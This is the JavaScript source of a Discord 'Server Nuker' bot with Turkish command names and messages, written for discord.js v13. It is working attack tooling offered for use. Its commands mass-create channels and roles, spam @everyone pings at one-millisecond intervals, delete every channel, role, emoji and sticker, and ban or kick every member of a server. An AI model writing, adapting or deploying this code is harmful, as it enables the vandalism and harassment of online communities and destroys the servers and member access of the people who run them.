/**
 * Server Nuker Beta
 * @author banker-peding
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")
const conf = require('../config/config.json')

nuker.on("ready", () => {
    console.clear();
    console.log(red(`

   
██████╗░░█████╗░███╗░░██╗██╗░░██╗███████╗██████╗░  ░░░░██╗  ██████╗░███████╗██████╗░██╗███╗░░██╗░██████╗░
██╔══██╗██╔══██╗████╗░██║██║░██╔╝██╔════╝██╔══██╗  ░░░██╔╝  ██╔══██╗██╔════╝██╔══██╗██║████╗░██║██╔════╝░
██████╦╝███████║██╔██╗██║█████═╝░█████╗░░██████╔╝  ░░██╔╝░  ██████╔╝█████╗░░██║░░██║██║██╔██╗██║██║░░██╗░
██╔══██╗██╔══██║██║╚████║██╔═██╗░██╔══╝░░██╔══██╗  ░██╔╝░░  ██╔═══╝░██╔══╝░░██║░░██║██║██║╚████║██║░░╚██╗
██████╦╝██║░░██║██║░╚███║██║░╚██╗███████╗██║░░██║  ██╔╝░░░  ██║░░░░░███████╗██████╔╝██║██║░╚███║╚██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝  ╚═╝░░░░  ╚═╝░░░░░╚══════╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░


╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯

                                      ©  Server Nuker Bot
                                   1. Bot Name: ${nuker.user.tag}
                                   2. Prefix: ${prefix}yardım
                                   3. Discord.js Versions: [v13]


    `))
    nuker.user.setActivity({ name: "Banker & Peding", type: "WATCHING" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`

    😈 ┊ Server Nuker **\`Yardım\`**
        
    \` ✅ ┊ ${prefix}kanal-oluştur [sayı] [kanal isim]\`᲼•᲼**${prefix}kanal-oluştur 5 deneme**
    \` ✅ ┊ ${prefix}kanal-etiket [sayı] [kanal isim], [mesaj] \`᲼•᲼**${prefix}kanal-etiket 5 deneme, spamtest**
    \` ✅ ┊ ${prefix}rol-oluştur [sayı] [rol isim] \`᲼•᲼**${prefix}rol-oluştur 5 roledeneme**
    \` ✅ ┊ ${prefix}kanal-sil \`᲼•᲼**${prefix}kanal-sil [Bütün Kanalları Siler]**
    \` ✅ ┊ ${prefix}rol-sil \`᲼•᲼**${prefix}rol-sil [Bütün Rolleri Siler] **
    \` ✅ ┊ ${prefix}emoji-sil \`᲼•᲼**${prefix}emoji-sil [Bütün Emojileri Siler]**
    \` ✅ ┊ ${prefix}sticker-sil \`᲼•᲼**${prefix}sticker-sil [Bütün Stickerları Siler]**
    \` ✅ ┊ ${prefix}kick \`᲼•᲼**${prefix}kick [Sunucudaki Herkesi Kickle]**
    \` ✅ ┊ ${prefix}ban \`᲼•᲼**${prefix}ban [Sunucudaki Herkesi Banlar]**

`)
        .setFooter(`© Server Nuker 2021`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "yardım")) {
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "kanal-oluştur")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "kanal-sil")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "kanal-etiket")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "rol-oluştur")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "rol-sil")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "sticker-sil")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "emoji-sil")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "ban")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "kick")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "kanal-oluştur")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "kanal-sil")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "kanal-etiket")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "rol-oluştur")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "rol-sil")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "sticker-sil")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "emoji-sil")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "ban")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "kick")) {
            if (message.author.id != userID) return message.reply("❎ ┊ Bu Komutu Kullanabilmek İçin Yeterli Yetkin Yok.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    // Nuking Functions

    /**
     * Excessive amount of channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("❎ ┊ Lütfen bir miktar girin");
            if (isNaN(amount)) return reject("❎ ┊ Lütfen Bir Sayı Kullanın");
            if (amount > 500) return reject("❎ ┊ Lütfen Kanal İsmini 500 den az olarak belirtin!");
            if (!channelPerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok!");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata Buldum: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata Buldum: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Excessive amount of channels and mentions
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent when everyone is mentioned
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("❎ ┊ Lütfen bir miktar girin");
            if (isNaN(amount)) return reject("❎ ┊ Lütfen Bir Sayı Kullanın");
            if (amount > 500) return reject("❎ ┊ Lütfen Kanal İsmini 500 den az olarak belirtin!");
            if (!channelPerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok!");
            if (!pingMessage) return reject("❎ ┊ Lütfen spamlamak istediğiniz mesajı belirtin");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata Buldum: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Hata Buldum: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Deletes all channels in a guild
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok!");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Hata Buldum: " + err)) }))
            resolve();
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("❎ ┊ Lütfen bir miktar girin");
            if (isNaN(amount)) return reject("❎ ┊ Lütfen Bir Sayı Kullanın");
            if (!rolePerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok!");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: conf.OwnerName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Hata Buldum: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Hata Buldum: " + err)) })
                }
            }
        })
    }

  
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Hata Buldum: " + err)) }))
        });
    }

 
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Hata Buldum: " + err)) }))
        });
    }


    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Hata Buldum: " + err)) }))
        });
    }

    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Hata Buldum: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} üyesi banlandı.`)) });
                    }
                }, 500);
            })
        })
    }


    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("❎ ┊ Botun Yeterli Yetkisi Yok");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Bulundu " + arrayOfIDs.length + " Kullanıcı.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banlanıyor...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Hata Buldum: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} üyesi kicklendi.`)) });
                    }
                }, 500);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
